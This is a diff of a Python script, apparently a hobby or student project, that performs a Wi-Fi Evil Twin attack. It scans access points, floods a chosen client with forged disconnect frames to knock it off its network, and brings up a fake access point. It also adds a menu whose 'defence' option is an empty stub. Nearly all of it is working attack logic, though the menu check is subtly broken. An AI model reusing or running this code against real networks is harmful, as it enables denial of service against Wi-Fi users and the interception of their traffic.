@@ -3,9 +3,9 @@ from threading import *
 import os
 import time
 
-import fakeAP as f_ap
-import CreateConf as cc
-import MonitorMode as mm
+import fakeAP as fake_ap
+# import CreateConf as cc
+# import MonitorMode as mm
 
 
 # Preparing the card for monitor mode
@@ -24,11 +24,6 @@ def AP_Scaning(sniff_network_adapter):
     print("Scanning for Access Points with %s..." % sniff_network_adapter)
     # Scan for 30 seconds
     sniff(iface = sniff_network_adapter, prn = PacketHandlerAP, timeout = 30)
-
-    # num = len(ap_list)
-    # for x in range(num):
-    #     # Num of AP, SSID, AP MAC
-    #     print(x, ap_list[x][1], ap_list[x][0])
 
     rescan = input("\nDo you want to rescan? [y/n]: ")
     if(rescan == "y"):
@@ -74,8 +69,8 @@ def extractSSID(ssid):
 
 
 def create_conf_file(iface, ssid, channel):
-    cc.Create_hostapd(iface, ssid, channel)
-    cc.Create_dnsmasq(iface)
+    fake_ap.Create_hostapd(iface, ssid, channel)
+    fake_ap.Create_dnsmasq(iface)
 
 
 def setChannel(channel, sniff_network_adapter):
@@ -109,14 +104,11 @@ def PacketHandlerClients(packet):
 
 # -------------Selecting a victim and performing an Evil-Twin attack ---------------
 
-# Disconnects the target from the network
+# Disconnects the target client from the network
 def attackClient(sniff_network_adapter, fakeAP_network_adapter):
     while len(clientList) == 0:
         print("No clients found, searching again...")
         clientScaning(target_mac, sniff_network_adapter)
-
-    # for x in range(len(clientList)):
-    #     print(x, clientList[x])
 
     rescan = input("Do you want to rescan? [y/n]: ")
     if(rescan == "y"):
@@ -124,23 +116,29 @@ def attackClient(sniff_network_adapter, fakeAP_network_adapter):
 
     choice = input("Choose index of client to attack: ")
 
-    f_ap.start(fakeAP_network_adapter)
+    # fake_ap.setup(fakeAP_network_adapter)
+    # finish = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
+    
+    setupAP(fakeAP_network_adapter)
 
-    disconnectThread = threading.Thread(
-        target=DisConnectAttack, args=(choice,sniff_network_adapter))
-    disconnectThread.daemon = True
-    disconnectThread.start()
-    time.sleep(10)
-    # threading.Timer(1000, setupAP).start()
+    # disconnectThread = threading.Thread(
+    #     target=DisconnectAttack, args=(choice,sniff_network_adapter))
+    # disconnectThread.daemon = True
+    # disconnectThread.start()
+    DisconnectAttack(choice, sniff_network_adapter)
+
+    time.sleep(3)
 
 allow = True
 
-# def setupAP():
-#     allow = False
-#     print('---> Raising up Fake AP spot\n')
-#     f_ap.start("wlan1")
+def setupAP(fakeAP_network_adapter):
+    allow = False
+    print('---> Raising up Fake AP spot\n')
+    fake_ap.init_setting()
+    fake_ap.AP_on(fakeAP_network_adapter)
+    finish = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
 
-def DisConnectAttack(choice, sniff_network_adapter):
+def DisconnectAttack(choice, sniff_network_adapter):
         # send the packet
         for y in range(1000):
             dot11 = Dot11(addr1 = clientList[int(choice)], addr2=target_mac, addr3=target_mac)
@@ -148,6 +146,13 @@ def DisConnectAttack(choice, sniff_network_adapter):
             sendp(packet, iface=sniff_network_adapter, count=30, inter = .001)
 
         print('---> Finishing sending prob requests to AP...\n')
+
+
+def Change_back_airmon(iface):
+    os.system("sudo airmon-ng stop "+ iface)
+    os.system("sudo systemctl start NetworkManager")
+    os.system("clear")
+
 # =================================================================================
 
 if __name__ == "__main__":
@@ -157,11 +162,20 @@ if __name__ == "__main__":
     
     switchToMonitorMode(sniff_network_adapter)
     
-    AP_Scaning(sniff_network_adapter)
-
-    attackAP(sniff_network_adapter, fakeAP_network_adapter)
-
-    attackClient(sniff_network_adapter, fakeAP_network_adapter)
-
-    mm.Change_back_airmon(sniff_network_adapter)
-    cc.Delete_conf_files()
+    print("~~~~~~~~~~~~~~ Welcome ~~~~~~~~~~~~~~\n")
+    print("1.Evil Twin Attack\n")
+    print("2.Evil Twin Active Defence\n")
+    choise = input("Choose option: ")
+    if choise == 1:
+        #Stages of Evil-Twin attack
+        AP_Scaning(sniff_network_adapter)
+        attackAP(sniff_network_adapter, fakeAP_network_adapter)
+        attackClient(sniff_network_adapter, fakeAP_network_adapter)
+    elif choise == 2:
+        print("defence")
+    else:
+        choise = input("Choose option: ")
+        
+    #End
+    Change_back_airmon(sniff_network_adapter)
+    fake_ap.Delete_conf_files()
